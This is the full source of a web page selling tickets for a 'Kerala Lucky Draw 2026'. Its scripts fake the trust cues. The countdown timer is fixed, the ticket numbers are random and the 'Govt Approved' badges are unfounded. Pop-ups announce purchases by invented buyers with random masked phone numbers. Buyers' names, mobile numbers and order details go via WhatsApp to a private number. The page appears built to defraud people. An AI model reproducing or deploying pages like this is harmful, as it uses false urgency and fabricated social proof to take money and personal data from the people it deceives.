<style>
:root{
--accent:#ff1744;
--accent-dark:#d50000;
--bg1:#fff0f5;
--bg2:#ffe6f0;
--card:#ffffff;
}

body{
margin:0;
background:linear-gradient(135deg,var(--bg1),var(--bg2));
font-family:Arial,sans-serif;
display:flex;
justify-content:center;
padding:10px;
}

.container{
width:100%;
max-width:400px;
background:var(--card);
padding:16px;
border-radius:16px;
box-shadow:0 8px 20px rgba(0,0,0,.15);
}

.heroBox{
background:linear-gradient(135deg,#ff4f79,#ff758c);
color:#fff;
padding:14px;
border-radius:12px;
text-align:center;
margin-bottom:10px;
box-shadow:0 4px 10px rgba(0,0,0,.15);
}
.heroBox h1{margin:0;font-size:18px;}
.heroBox p{margin:4px 0 0;font-size:12px;opacity:.9;}

.topLogo img{
width:120px;
display:block;
margin:0 auto 6px;
}

.livePop{
display:inline-block;
padding:6px 14px;
border-radius:20px;
background:linear-gradient(90deg,#2ecc71,#27ae60);
color:#fff;
font-size:12px;
font-weight:bold;
animation:pulse 1.2s infinite;
}
@keyframes pulse{
0%{transform:scale(1);}
50%{transform:scale(1.05);}
100%{transform:scale(1);}
}

.timerBar{
background:#e8f5e9;
color:#1b5e20;
padding:6px;
border-radius:8px;
font-size:12px;
text-align:center;
font-weight:bold;
margin-bottom:8px;
}

input,select,button{
width:100%;
padding:10px;
margin-bottom:8px;
border-radius:8px;
border:1px solid #ddd;
font-size:13px;
}

.ticketBox{
border:2px dashed #ff4f79;
border-radius:12px;
padding:10px;
margin-bottom:8px;
background:#fff7fa;
}

.ticketAmount{
background:#e8f5e9;
color:#1b5e20;
padding:6px;
border-radius:8px;
text-align:center;
font-weight:bold;
margin-bottom:6px;
font-size:13px;
}

select[multiple]{height:90px;}

.trustBadges{
font-size:11px;
color:#2e7d32;
background:#e8f5e9;
padding:8px;
border-radius:8px;
margin-bottom:8px;
text-align:center;
font-weight:bold;
}

button{
background:linear-gradient(90deg,var(--accent),var(--accent-dark));
color:#fff;
border:none;
font-weight:bold;
cursor:pointer;
font-size:15px;
padding:12px;
border-radius:10px;
box-shadow:0 4px 10px rgba(0,0,0,.2);
transition:.2s;
}
button:hover{transform:scale(1.03);}
button:disabled{opacity:.5;cursor:not-allowed;}

#livePopup{
position:fixed;
bottom:90px;
left:10px;
right:10px;
margin:auto;
max-width:330px;
background:#fff;
border-radius:12px;
box-shadow:0 0 25px rgba(0,0,0,0.4);
padding:12px;
display:none;
z-index:999999;
font-size:13px;
}

#livePopup.show{
display:block;
animation:fadeIn 0.5s;
}

@keyframes fadeIn{
from{opacity:0;transform:translateY(40px);}
to{opacity:1;transform:translateY(0);}
}
</style>
</head>

<body>
<div class="container">

<div class="topLogo">
<img src="https://i.postimg.cc/XvXzF7RJ/IMG-20251225-WA0003.jpg">
</div>

<div class="heroBox">
<h1>üéâ Kerala Lucky Draw 2026</h1>
<p>Win Big Prizes | Limited Seats Available</p>
</div>

<div style="text-align:center;margin-bottom:6px;">
<span class="livePop">üü¢ LIVE BOOKING ACTIVE</span>
</div>

<div class="timerBar" id="timer">‚è≥ Booking closes in 30:00</div>

<input id="name" placeholder="Full Name">
<input id="mobile" placeholder="Mobile Number">

<div class="ticketBox">
<div class="ticketAmount" id="ticketAmount">üí∞ Minimum 3 tickets required</div>
<select id="ticket" multiple></select>

<!-- Selected Tickets Show Here -->
<div id="selectedTickets" style="margin-top:6px;"></div>

</div>

<input id="amount" placeholder="Total Amount (‚Çπ)" readonly>

<div class="trustBadges">
‚úî Govt Approved | ‚úî 100% Secure | ‚úî Instant Confirmation
</div>

<button id="submitBtn" disabled>Submit & Continue</button>

</div>

<div id="livePopup">
<div id="liveText"></div>
<div class="liveTime">Just now</div>
</div>

<script>
let time=1800;
setInterval(()=>{
 let m=Math.floor(time/60),s=time%60;
 document.getElementById("timer").textContent=`‚è≥ Booking closes in ${m}:${s.toString().padStart(2,"0")}`;
 if(time>0) time--;
},1000);

const TICKET_PRICE=40;
const MIN_TICKETS=3;

const ticket=document.getElementById("ticket"),
amount=document.getElementById("amount"),
ticketAmount=document.getElementById("ticketAmount"),
submitBtn=document.getElementById("submitBtn"),
nameI=document.getElementById("name"),
mobileI=document.getElementById("mobile"),
selectedTicketsDiv=document.getElementById("selectedTickets");

for(let i=0;i<2000;i++){
 let n=("000000"+Math.floor(Math.random()*999999)).slice(-6);
 let o=document.createElement("option");
 o.value="KL"+n;
 o.textContent="KL"+n;
 ticket.appendChild(o);
}

function refresh(){
 let sel=[...ticket.selectedOptions];

 selectedTicketsDiv.innerHTML="";
 
 sel.forEach(o=>{
   let tag=document.createElement("span");
   tag.style.display="inline-block";
   tag.style.background="#ffd6e0";
   tag.style.color="#c2185b";
   tag.style.padding="5px 10px";
   tag.style.margin="3px";
   tag.style.borderRadius="20px";
   tag.style.fontSize="12px";
   tag.style.cursor="pointer";
   tag.textContent=o.value+" √ó";
   
   tag.onclick=()=>{
     o.selected=false;
     refresh();
   };

   selectedTicketsDiv.appendChild(tag);
 });

 if(sel.length>=MIN_TICKETS){
   let total=sel.length*TICKET_PRICE;
   amount.value="‚Çπ "+total;
   ticketAmount.textContent="üí∞ Total Amount: ‚Çπ "+total;
 }else{
   amount.value="";
   ticketAmount.textContent="üí∞ Minimum 3 tickets required";
 }

 submitBtn.disabled=!(sel.length>=MIN_TICKETS && nameI.value.trim() && mobileI.value.length>=10);
}

ticket.addEventListener("change",refresh);
[nameI,mobileI].forEach(i=>i.addEventListener("input",refresh));

mobileI.addEventListener("input",()=>{
 mobileI.value = mobileI.value.replace(/\D/g,'');
});

submitBtn.onclick=()=>{
 fbq('track','Lead');

 let tickets=[...ticket.selectedOptions].map(o=>o.value).join(", ");
 let msg=`New Booking
Name: ${nameI.value}
Mobile: ${mobileI.value}

Tickets:
${tickets}

Total Tickets: ${ticket.selectedOptions.length}
Amount: ${amount.value}`;

 window.open("https://wa.me/+917070974038?text="+encodeURIComponent(msg),"_blank");
};

const liveNames=["Arjun","Karthik","Ramesh","Lakshmi","Anjali","Priya","Vijay","Naveen"];
const liveCities=["Bengaluru","Chennai","Hyderabad","Kochi","Mysuru","Madurai"];

function randomPhone(){
let n="9";
for(let i=0;i<9;i++) n+=Math.floor(Math.random()*10);
return n.substring(0,3)+"****"+n.substring(7);
}

function randomTicketCount(){
 return Math.floor(Math.random()*10)+3;
}

function showLivePopup(){
let name=liveNames[Math.floor(Math.random()*liveNames.length)];
let city=liveCities[Math.floor(Math.random()*liveCities.length)];
let ph=randomPhone();
let ticketCount=randomTicketCount();

document.getElementById("liveText").innerHTML=
"<span class='liveName'>"+name+"</span> ("+ph+") from "+city+
" just booked "+ticketCount+" tickets üéüüî•";

let popup=document.getElementById("livePopup");
popup.classList.add("show");
setTimeout(()=>popup.classList.remove("show"),5000);
}

setTimeout(showLivePopup,2000);
setInterval(showLivePopup,8000);
</script>

</body>
</html>
